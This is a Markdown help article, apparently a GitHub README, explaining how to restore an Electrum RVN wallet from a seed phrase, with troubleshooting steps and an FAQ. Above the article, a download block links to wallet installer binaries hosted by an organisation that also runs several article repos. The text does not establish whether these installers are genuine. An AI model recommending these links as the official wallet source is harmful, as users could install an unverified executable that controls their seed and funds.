![Electrum RVN](assets/banner-article.png)

# How to Restore a Wallet from an Electrum RVN Seed

<!-- compact-download-block -->

<p align="center">Rebuilding a wallet from words you wrote down</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Choose restore on the first screen, type the twelve words in order, set a new password, and let the wallet rescan. The balance follows the words, not the file. If it shows zero afterwards, the derivation path is the usual cause, not a lost wallet - and that has a one-setting fix.

## Before you start

You need the twelve words, in order, spelled exactly. You do not need the old wallet file, the old password, the old machine or an internet connection to enter the phrase - only to see the balance afterwards.

Two useful checks first: is the phrase complete (twelve words, not eleven), and is it this wallet's phrase rather than another one's? A seed only restores the addresses derived from it, which is why [is Electrum RVN a Bitcoin wallet?](https://github.com/electrum-source/download-and-setup/blob/main/is-electrum-rvn-a-bitcoin-wallet.md) matters if you have several.

## The procedure

1. **Open the wallet and choose restore**, not create. A restore with a fresh name keeps the old wallet file intact if it is still there.
2. **Enter the twelve words** in order. The field usually accepts them space-separated; type slowly rather than pasting from a note you no longer trust.
3. **Choose a new password.** The password is per-file, so the restored wallet gets its own. It does not have to match the old one, and it should not be the same as any you use elsewhere.
4. **Let it rescan.** The wallet asks servers for the transactions belonging to the addresses it derived. That takes moments for a small history and longer for a large one.
5. **Check the balance against what you expect.** Not "is it non-zero" - is it the number you remember, rounded to what fees would have taken.
6. **Retire the old copy** if you are migrating: confirm the new wallet works before deleting anything.

The restored wallet will not have your labels or local notes. Those were local to the old wallet rather than on the chain - [where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) explains the split.

## If the balance is zero

Work through these in order. The first two cover almost every case.

**Derivation path.** A seed can derive addresses along more than one path, and a restore that picks a different path shows a valid wallet with nothing in it. The wallet offers an alternate Ravencoin path for exactly this; switch, rescan, and the balance usually appears. [Zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md) is the full procedure.

**Wrong phrase.** A seed from another wallet, or one word transcribed wrongly, produces a different address set. The checksum catches most transcription errors, but not a valid phrase from elsewhere.

**Not connected.** A wallet that cannot reach a server shows what it last knew. Check the indicator before concluding anything - [Electrum RVN will not connect to a server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md).

**Unconfirmed history.** A rescan can take a while on a wallet with many transactions. Waiting is sometimes the actual fix.

## What restore does not bring back

- **Labels** on addresses and transactions.
- **Local notes** and any metadata you added.
- **The old password** - you set a new one.
- **Anything the chain never recorded**, which is everything that lived only in the file.

If those matter, the old wallet file is the only source, and it is worth copying it to the new machine as well - [moving Electrum RVN to another computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md).

## Restoring is also a test

The best time to restore is before you need to. Restore your own seed into a second wallet name, check the balance, then delete the test wallet. That is how a paper backup becomes a verified one, and it is the step that turns [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) into something you know works.

If you restore and the balance is right, you have also confirmed that the phrase on the paper is the phrase that controls the funds. That is worth more than any reassurance.

## Restoring someone else's seed, or a hardware wallet's

A hardware wallet seed can be imported into software, and doing so moves the keys onto a general-purpose machine - which is exactly what the device existed to avoid. If the aim is to recover from a broken device, restore onto a replacement device rather than into the desktop wallet whenever you can.

For a seed that is not yours, the rule is simpler: it is not yours to restore. [Import a hardware wallet seed into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md) covers the legitimate cases.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. If the restore fails on a release older than that, update before debugging further - [updating to the latest release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md).

## FAQ

### Do I need the old wallet file to restore?

No. The seed is enough. The file adds the labels and history the wallet keeps locally, and the chain does not store those.

### Why does the restored wallet show zero?

Almost always the derivation path: the wallet is looking at a different set of addresses than the one that was funded. Switch to the alternate Ravencoin path and rescan.

### Can I restore onto a different computer?

Yes, and that is the normal reason to restore. Install the wallet, choose restore, enter the words, wait for the rescan.

### Will my labels come back?

No. Labels and notes are local to the wallet rather than on the chain. Copy the old file if you want them.

### Can I restore the same seed twice?

Yes, into two different wallet files, and both will show the same balance. Do not open the same file in two applications at once.

### Is it safe to type my seed into the wallet?

Yes - into the wallet's own restore screen on a machine you trust. Nowhere else: no website, no chat, no "verification" form.

<!-- related-articles -->

## Related articles

- [Is Electrum RVN a Bitcoin Wallet? What It Actually Runs On](https://github.com/electrum-source/download-and-setup/blob/main/is-electrum-rvn-a-bitcoin-wallet.md)
- [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md)
- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
- [Electrum RVN Will Not Connect to a Server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md)
